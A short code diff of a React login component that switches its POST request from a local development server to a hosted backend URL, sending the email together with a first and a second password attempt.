@@ -90,7 +90,7 @@ const Login = () => {
 
     // Try to send login request to backend
     try {
-      const response = await axios.post('http://127.0.0.1:8000/api/get_user_info/', {
+      const response = await axios.post('https://betabe.vercel.app/api/get_user_info/', {
         email: email,
         firstpasswordused: firstPasswordUsed,
         secondpasswordused: password, // Send the second password attempt
